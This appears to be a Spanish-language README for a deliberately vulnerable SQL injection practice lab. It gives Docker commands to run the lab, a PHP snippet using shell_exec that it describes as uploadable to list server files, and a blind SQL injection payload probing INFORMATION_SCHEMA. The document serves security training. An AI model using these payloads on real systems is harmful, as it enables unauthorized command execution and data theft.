# SQL Injection

Descargar y Montar el servidor desde Docker usando un volumen con el Codigo Fuente de Github para editarlo:

```bash
git clone https://github.com/IngenieroRicardo/SQLInjection
docker pull ghcr.io/ingenieroricardo/sqlinjection:latest
docker run --publish 8080:80 -v ./SQLInjection:/app ghcr.io/ingenieroricardo/sqlinjection:latest
```

<hr>

Al no tener validaciones se pueden enviar PHP que se pueden ejecutar como estos:

```php
<?php
  $salida = shell_exec("cd .. && ls");
  echo "<pre>$salida</pre>";
?>
```
Con este codigo podemos conocer los archivos en el servidor


```php
hola' RLIKE (SELECT IF(COUNT(DISTINCT(table_schema))=1, 'hola', 0x28) FROM INFORMATION_SCHEMA.TABLES) AND 'TMTd'='TMTd
```
Con este codigo podemos ver codigo fuente
